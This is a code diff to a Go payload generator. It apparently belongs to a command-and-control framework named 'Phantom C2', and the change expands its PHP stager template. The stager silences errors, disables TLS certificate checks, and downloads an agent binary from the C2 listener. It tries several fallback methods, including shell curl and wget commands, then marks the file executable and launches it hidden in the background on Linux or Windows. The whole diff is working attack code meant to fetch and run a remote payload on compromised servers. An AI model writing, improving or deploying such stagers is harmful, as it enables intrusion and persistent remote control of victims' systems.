@@ -124,33 +124,61 @@ if (Request.Headers["X-Debug-Token"] == "{{.Token}}") {
 
 func generatePHP(cfg PayloadConfig) (string, error) {
 	tmpl := `<?php
-// Phantom C2 — PHP Stager
-// Downloads and executes the agent — works on any PHP environment
+// Phantom C2 — PHP Stager (Self-contained)
+// Downloads agent from C2 listener and executes it
+// Falls back to multiple download methods if one fails
 error_reporting(0);
+set_time_limit(0);
 $url = '{{.ListenerURL}}/api/v1/update';
 $tmp = tempnam(sys_get_temp_dir(), '.update');
 
-// Download agent binary
-$data = @file_get_contents($url);
-if (!$data) {
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    $data = curl_exec($ch);
-    curl_close($ch);
+// Try multiple download methods
+$data = false;
+
+// Method 1: file_get_contents
+$ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false), 'http' => array('timeout' => 30)));
+$data = @file_get_contents($url, false, $ctx);
+
+// Method 2: curl
+if (!$data || strlen($data) < 100) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    }
+}
+
+// Method 3: exec curl/wget
+if (!$data || strlen($data) < 100) {
+    @exec("curl -sk -o $tmp '$url' 2>/dev/null");
+    if (file_exists($tmp) && filesize($tmp) > 100) {
+        chmod($tmp, 0755);
+        exec("nohup $tmp > /dev/null 2>&1 &");
+        echo "[+] Agent deployed via curl\n";
+        exit;
+    }
+    @exec("wget --no-check-certificate -q -O $tmp '$url' 2>/dev/null");
+    if (file_exists($tmp) && filesize($tmp) > 100) {
+        chmod($tmp, 0755);
+        exec("nohup $tmp > /dev/null 2>&1 &");
+        echo "[+] Agent deployed via wget\n";
+        exit;
+    }
 }
 
 if ($data && strlen($data) > 100) {
     file_put_contents($tmp, $data);
     chmod($tmp, 0755);
-    // Execute in background
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
         pclose(popen("start /B $tmp", "r"));
     } else {
         exec("nohup $tmp > /dev/null 2>&1 &");
     }
-    echo "[+] Agent deployed (PID started)\n";
+    echo "[+] Agent deployed\n";
 } else {
     echo "[-] Failed to download agent from $url\n";
 }
